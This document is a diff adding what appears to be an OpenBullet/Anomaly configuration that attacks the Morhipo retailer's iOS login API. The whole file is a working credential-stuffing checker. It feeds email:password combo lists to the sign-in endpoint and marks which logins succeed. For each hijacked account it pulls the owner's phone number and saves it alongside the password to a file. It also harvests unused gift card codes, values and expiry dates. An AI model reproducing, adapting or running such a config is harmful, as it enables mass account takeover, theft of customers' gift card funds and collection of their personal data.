@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "iOS API Morhipo",
+  "SuggestedBots": 110,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T13:57:58.647591+00:00",
+  "AdditionalInfo": "",
+  "Author": "KaraMeleKk",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://mobile-middleware.morhipo.com/mobile/v3/user/Signin" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"appname\":\"iphone\",\"rememberme\":\"false\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "appVersion: 8.3.8" 
+  HEADER "Content-Type: application/json" 
+  HEADER "deviceType: phone" 
+  HEADER "Host: mobile-middleware.morhipo.com" 
+  HEADER "osVersion: 15.5" 
+  HEADER "platform: ios" 
+  HEADER "User-Agent: morhipo/8.3.8 (iPhone; iOS 15.5; Scale/3.00)" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Success\":false" 
+  KEYCHAIN Success OR 
+    KEY "Success\":true" 
+
+REQUEST GET "https://mobile-middleware.morhipo.com/mobile/v3/user/userinfo" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "MobilePhone" CreateEmpty=FALSE -> CAP "Telefon" 
+
+UTILITY File "Morhipo Telpass.txt" AppendLines "<Telefon>:<PASS>" 
+
+REQUEST GET "https://mobile-middleware.morhipo.com/mobile/v3/user/couponlist" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "NotUsedGiftCard" Recursive=TRUE -> VAR "aktifkuponlar" 
+
+PARSE "<aktifkuponlar>" JSON "Point" CreateEmpty=FALSE -> CAP "Kupon Değeri" 
+
+PARSE "<aktifkuponlar>" LR "\"ExpireDate\": \"" "T" CreateEmpty=FALSE -> CAP "Bitiş T." 
+
+PARSE "<aktifkuponlar>" JSON "CardCondition" CreateEmpty=FALSE -> CAP "Kupon Şartı" 
+
+PARSE "<aktifkuponlar>" JSON "GiftCardCode" CreateEmpty=FALSE -> CAP "Kupon Kodu" 
+
